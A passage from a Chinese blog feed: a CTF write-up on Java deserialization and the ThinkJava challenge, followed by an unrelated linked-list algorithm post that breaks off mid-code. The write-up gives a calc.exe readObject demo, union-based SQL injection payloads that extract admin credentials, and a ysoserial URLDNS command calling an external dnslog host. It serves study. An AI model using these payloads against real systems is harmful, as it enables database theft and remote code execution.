href="https://github.com/frohoff/ysoserial%EF%BC%8C%E5%88%A9%E7%94%A8%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8Chttps://github.com/NickstaDB/SerializationDumper">https://github.com/frohoff/ysoserial，利用原生类的反序列化，https://github.com/NickstaDB/SerializationDumper</a> 还原Java的序列化数据</p><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上面代码所示，电脑会弹出计算器</p><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><p><a href="https://xz.aliyun.com/t/13279?time__1311=GqmxuD0DnAitKGNeeeqBK40KbqWqyGrEbD">https://xz.aliyun.com/t/13279?time__1311=GqmxuD0DnAitKGNeeeqBK40KbqWqyGrEbD</a></p><h2 id="网鼎杯2020朱雀组-ThinkJava"><a href="#网鼎杯2020朱雀组-ThinkJava" class="headerlink" title="[网鼎杯2020朱雀组]ThinkJava"></a>[网鼎杯2020朱雀组]ThinkJava</h2><p><a href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html</a><br><a href="https://c.biancheng.net/view/5532.html">https://c.biancheng.net/view/5532.html</a><br><a href="https://www.cnblogs.com/h3zh1/p/12914439.html">https://www.cnblogs.com/h3zh1/p/12914439.html</a></p><p>这道题开始拿到的有个url，访问时显示没有权限，暂时没有突破点，还有个class压缩包，其中有一些代码，打开后发现有相关的数据库操作类，其中有个swagger，想到swagger的未授权访问，这里用曾哥的脚本扫描下</p><img src="/2024/09/12/WebSecurity/javadeserialization/image.png" class=""><p><a href="https://github.com/AabyssZG/SpringBoot-Scan">https://github.com/AabyssZG/SpringBoot-Scan</a></p><img src="/2024/09/12/WebSecurity/javadeserialization/image-1.png" class=""><p>访问页面发现有swagger接口测试的口子</p><img src="/2024/09/12/WebSecurity/javadeserialization/image-2.png" class=""><p>观察发现sqlDict，对应下载下来的代码中sqlDict类，这个类的方法<code>getTableData</code>存在sql注入的可能性<br>分析下载的sqlDict代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlDict</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                pass = <span class="string">&quot;abc@12345&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">                <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码使用jdbc连接数据库，且我们可以知道的是数据库连接的账号密码，以及存在myapp库。<br>我们可控的变量是 dbName ，正常来说 dbname 应当是个数据库名称<br>所以我们应当构造 dbname ，既能够使数据库成功连接到myapp库，又能够闭合执行语句，执行我们自定义的代码<br><a href="https://www.cnblogs.com/ljl150/p/12045942.html">https://www.cnblogs.com/ljl150/p/12045942.html</a><br>JDBC解析数据库的方式类似于URL解析，也就是在构造这条语句时：<code>dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;</code><br>我们需要传入的dbName被成功解析为myapp，有两种思路构造：</p><ul><li>#的方式：在url中#表示锚点，表示网页中的一个位置，比如http:xxx&#x2F;index.html#aaa，浏览器读取这个url，会将aaa移到可视位置。在第一个#，都会被视为位置标识符，不会被发送到服务端</li><li>?参数 的方式，因为在URL中？后面的内容将被视为参数，就可以构造类似这样的http:xxx&#x2F;index.html?a&#x3D;1，后面再跟闭合和注入语句</li></ul><p>那么我们构造下面的payload获取数据库的表名：<br><code>myapp?a=111&#39; union select group_concat(table_name) from (information_schema.tables);#</code><br>得到如下输出：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isPK&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;INT&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VARCHAR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VARCHAR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;操作成功&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamps&quot;</span><span class="punctuation">:</span> <span class="number">1726551375306</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>判断得user表中存在name和pwd字段，构造下面的payload查询：<br><code>myapp?a=111&#39; union select group_concat(name, pwd) from (user);#</code><br>得到账号密码为：admin admin@Rrrr_ctf_asde，接着利用上面的接口测试</p><img src="/2024/09/12/WebSecurity/javadeserialization/image-3.png" class=""><p>这里看到返回的值，明显是java序列化后的特征，使用获取到的凭证测试第一个接口post &#x2F;common&#x2F;user&#x2F;current 成功执行，判断该接口对数据进行反序列化，使用ysoserial测试：<br><a href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a><br><code>java -jar ysoserial-all.jar URLDNS &quot;http://xho2o5.dnslog.cn&quot; &gt; f.txt</code><br>之后使用脚本处理下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;f.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(ba)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>将处理后的数据作为token传输，成功验证存在漏洞，之后就可以通过反弹shell等方式获取flag</p><p>待办：cc链 Cb链分析</p><h2 id="DASCTF-Java反序列化-easyjava"><a href="#DASCTF-Java反序列化-easyjava" class="headerlink" title="[DASCTF][Java反序列化]easyjava"></a>[DASCTF][Java反序列化]easyjava</h2><p><a href="https://blog.csdn.net/solitudi/article/details/119322658">https://blog.csdn.net/solitudi/article/details/119322658</a></p><h1 id="CVE漏洞"><a href="#CVE漏洞" class="headerlink" title="CVE漏洞"></a>CVE漏洞</h1><h2 id="Jboss-反序列化-CVE-2017-12149"><a href="#Jboss-反序列化-CVE-2017-12149" class="headerlink" title="Jboss 反序列化(CVE-2017-12149)"></a>Jboss 反序列化(CVE-2017-12149)</h2><p><a href="https://www.cnblogs.com/sainet/p/15632205.html">https://www.cnblogs.com/sainet/p/15632205.html</a></p><h2 id="Weblogic反序列化（CVE-2023-21839）"><a href="#Weblogic反序列化（CVE-2023-21839）" class="headerlink" title="Weblogic反序列化（CVE-2023-21839）"></a>Weblogic反序列化（CVE-2023-21839）</h2><p><a href="https://www.cnblogs.com/BlogVice-2203/p/17454727.html">https://www.cnblogs.com/BlogVice-2203/p/17454727.html</a></p><h2 id="Fastjson-反序列化"><a href="#Fastjson-反序列化" class="headerlink" title="Fastjson 反序列化"></a>Fastjson 反序列化</h2><p><a href="https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/">https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】链表</title>
      <link href="/2024/09/11/algorithm/List/"/>
      <url>/2024/09/11/algorithm/List/</url>
      
        <content type="html"><![CDATA[<p>算法系列文章目前是跟着<a href="https://www.programmercarl.com/">代码随想录</a>学习</p><h1 id="链表基础"><a href="#链表基础" class="headerlink" title="链表基础"></a>链表基础</h1><p>单链表、双链表（每一个节点有两个指针域，一个指向下一个节点，一个指向上一个节点）、循环链表<br>链表操作的两种方式：直接使用原来的链表来进行操作。设置一个虚拟头结点在进行操作。<br>链表的存储方式：数组（内存中连续）、链表(内存中不连续)</p><h1 id="707-设计链表"><a href="#707-设计链表" class="headerlink" title="707.设计链表"></a>707.设计链表</h1><p>题意：<br>在链表类中实现这些功能：<br>get(index)：获取链表中第 index 个节点的值。如果索引无效，则返回-1。<br>addAtHead(val)：在链表的第一个元素之前添加一个值为 val 的节点。插入后，新节点将成为链表的第一个节点。<br>addAtTail(val)：将值为 val 的节点追加到链表的最后一个元素。<br>addAtIndex(index,val)：在链表中的第 index 个节点之前添加值为 val  的节点。如果 index 等于链表的长度，则该节点将附加到链表的末尾。如果 index 大于链表长度，则不会插入节点。如果index小于0，则在头部插入节点。<br>deleteAtIndex(index)：如果索引 index 有效，则删除链表中的第 index 个节点。</p><p>单链表版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode()&#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span>&#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = head.next;</span><br><span class="line">        head.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pred</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span 